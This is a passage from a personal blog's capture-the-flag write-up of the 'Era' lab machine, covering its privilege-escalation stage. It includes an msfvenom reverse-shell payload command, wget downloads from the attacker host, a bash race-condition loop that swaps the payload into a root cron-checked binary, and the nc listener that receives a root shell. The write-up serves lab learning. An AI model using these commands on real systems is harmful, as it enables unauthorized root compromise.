<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eric@era:/opt/AV/periodic-checks$ <span class="built_in">ls</span> -lsa</span><br><span class="line"><span class="built_in">ls</span> -lsa</span><br><span class="line">total 32</span><br><span class="line"> 4 drwxrwxr-- 2 root devs  4096 Jul 28 19:55 .</span><br><span class="line"> 4 drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..</span><br><span class="line">20 -rwxrw---- 1 root devs 16544 Jul 28 19:55 monitor</span><br><span class="line"> 4 -rw-rw---- 1 root devs   205 Jul 28 19:55 status.log</span><br><span class="line">eric@era:/opt/AV/periodic-checks$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(eric) gid=1000(eric) <span class="built_in">groups</span>=1000(eric),1001(devs)</span><br></pre></td></tr></table></figure>
<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>I wanted to look at other process running and maybe crons. I copied over <em>pspy64</em> to see any processes running in the background we might have missed.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2025/07/28 20:01:04 CMD: UID=0     PID=5038   | <span class="built_in">rm</span> -f text_sig_section.bin</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5045   | /usr/sbin/CRON -f -P</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5046   |</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5047   |</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5048   | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5049   | /bin/bash /root/initiate_monitoring.sh</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5050   | /bin/bash /root/initiate_monitoring.sh</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5051   | /bin/bash /root/initiate_monitoring.sh</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5052   | /bin/bash /root/initiate_monitoring.sh</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5053   |</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5054   | /bin/bash /root/initiate_monitoring.sh</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5055   | ???</span><br><span class="line">2025/07/28 20:02:01 CMD: UID=0     PID=5057   | /opt/AV/periodic-checks/monitor</span><br></pre></td></tr></table></figure>
<p>Ok, so we see that it runs <em>objcopy</em> to check <em>monitor</em>. When I was reseaching I came across a <a target="_blank" rel="noopener" href="https://www.wiz.io/vulnerability-database/cve/cve-2021-20197">article</a> talking about a race condition we could try to abuse. I came up with a very small script the will take my reverse shell binary I cooked up with <em>msfvenom</em> and the copy of <em>monitor</em> I made and continuously replace each other, hoping this will be enough to beat the race condition.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">TARGET_FILE=<span class="string">&quot;/opt/AV/periodic-checks/monitor&quot;</span></span><br><span class="line"></span><br><span class="line">LEGIT_FILE=<span class="string">&quot;/tmp/monitor&quot;</span></span><br><span class="line">MAL_FILE=<span class="string">&quot;/tmp/lame&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$MAL_FILE</span>&quot;</span> <span class="string">&quot;<span class="variable">$TARGET_FILE</span>&quot;</span> 2&gt;/dev/null</span><br><span class="line">    <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$LEGIT_FILE</span>&quot;</span> <span class="string">&quot;<span class="variable">$TARGET_FILE</span>&quot;</span> 2&gt;/dev/null</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>After getting a listener ready, we get a copy of <em>monitor</em> to <code>/tmp</code> and our malicous ELF binary over to the machine. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">eric@era:/tmp$ <span class="built_in">cp</span> /opt/AV/periodic-checks/monitor .</span><br><span class="line">eric@era:/tmp$ wget 10.10.14.7/lame</span><br><span class="line">--2025-07-28 20:40:02--  http://10.10.14.7/lame</span><br><span class="line">Connecting to 10.10.14.7:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 194 [application/octet-stream]</span><br><span class="line">Saving to: ‚Äòlame‚Äô</span><br><span class="line"></span><br><span class="line">lame                100%[===================&gt;]     194  --.-KB/s    <span class="keyword">in</span> 0.003s</span><br><span class="line"></span><br><span class="line">2025-07-28 20:40:02 (73.4 KB/s) - ‚Äòlame‚Äô saved [194/194]</span><br><span class="line"></span><br><span class="line">eric@era:/tmp$ wget 10.10.14.7/privCheck.sh</span><br><span class="line">--2025-07-28 20:40:20--  http://10.10.14.7/privCheck.sh</span><br><span class="line">Connecting to 10.10.14.7:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 222 [text/x-sh]</span><br><span class="line">Saving to: ‚ÄòprivCheck.sh‚Äô</span><br><span class="line"></span><br><span class="line">privCheck.sh        100%[===================&gt;]     222  --.-KB/s    <span class="keyword">in</span> 0s</span><br><span class="line"></span><br><span class="line">2025-07-28 20:40:20 (24.4 MB/s) - ‚ÄòprivCheck.sh‚Äô saved [222/222]</span><br><span class="line"></span><br><span class="line">eric@era:/tmp$</span><br></pre></td></tr></table></figure>
<p><em>REVERSE SHELL</em><br><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f elf &gt; lame</code></p>
<p>After waiting a minute or two‚Ä¶.or five üòë, we finally get a callback.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">konoha# rlwrap -cAr nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.14.7] from (UNKNOWN) [10.10.11.79] 52422</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>

<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a><a class="post-meta__tags" href="/tags/TOCTOU/">TOCTOU</a></div><div class="post-share"><div class="social-share" data-image="/img/era.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/23/ShareThePainAD/" title="ShareThePainAD"><img class="cover" src="/img/Share.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">ShareThePainAD</div></div><div class="info-2"><div class="info-item-1"> This Active Directory machine starts of with ZERO CREDENTIALS. So our initial scan shows us normal ports open for a server. We first check SMB to find we have guest auth to a ‚ÄòShare‚Äô directory. We have READ,WRITE to the directory. So after uploading a lnk file we capture the hash for bob.ross. Once a bloodhound dump is obtained, we find we have GenericAll to user alice.wonderland. We can do this a couple ways (i.e. ShadowCreds, Set a SPN and TargetedKerberoast). Then again, you can simply reset her password, which is what I did üòÅ. This user alice.wonderland has access to the box. After poking around some we find a SQL directory at C:\ but no access. Nevertheless, this is a older Windows Machine (Server 2022). Using CVE-2024-35250 to exploit at the kernel level we are able to SYSTEM using msfconsole.  Initial Scan12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970PORT     STATE SERVICE       REASON    ...</div></div></div></a><a class="pagination-related" href="/2025/06/30/Rustykey/" title="Rustykey (Windows Hard)"><img class="cover" src="/img/rustykey.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Rustykey (Windows Hard)</div></div><div class="info-2"><div class="info-item-1"> This Windows Hard box starts off assumed breach. While enumerating with the credentials you find that NTLM is disabled. Using your credentials you‚Äôre able to obtain a kerberos ticket that lets you get a bloodhound dump and further enumerate the machine. Once done, you‚Äôre able to kerberoast SPNs(Some did timeroast) and obtain some hashes, which one of them cracks to cleartext for IT-Computer3$. Using your new found credentials you‚Äôre able to abuse DACLs that allows our user to remove objects from the Protected Objects group. Thus allowing for ForceChangePassword and after successfully changing the password for bb.morgan, we are able to get a kerberos ticket, setup our krb5.conf and evil-winrm onto the box.  Enumeration as bb.morgan shows very little, yet we had a user ee.reed in the Support group. After changing his password, creating a reverse shell and using RunasCs.exe, we‚Äôre able to get a shell as ee.reed. Using PrivescCheck.ps1 shows us a COM Registry component we have...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping üîêüîê</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP-for-smiles"><span class="toc-number">2.</span> <span class="toc-text">FTP for smiles</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP"><span class="toc-number">3.</span> <span class="toc-text">HTTP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code-for-Downloading-Admin"><span class="toc-number">3.1.</span> <span class="toc-text">Source Code for Downloading - Admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Security-Questions"><span class="toc-number">3.2.</span> <span class="toc-text">Security Questions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-the-flaw-in-a-new-Era-%F0%9F%98%83%F0%9F%A4%A3"><span class="toc-number">3.3.</span> <span class="toc-text">Exploiting the flaw in a new Era üòÉü§£</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Yuri-ka-We-did-it"><span class="toc-number">4.</span> <span class="toc-text">Yuri-ka!!!! We did it!!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#So-Eric-now-what"><span class="toc-number">5.</span> <span class="toc-text">So Eric, now what??</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">6.</span> <span class="toc-text">PrivEsc</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>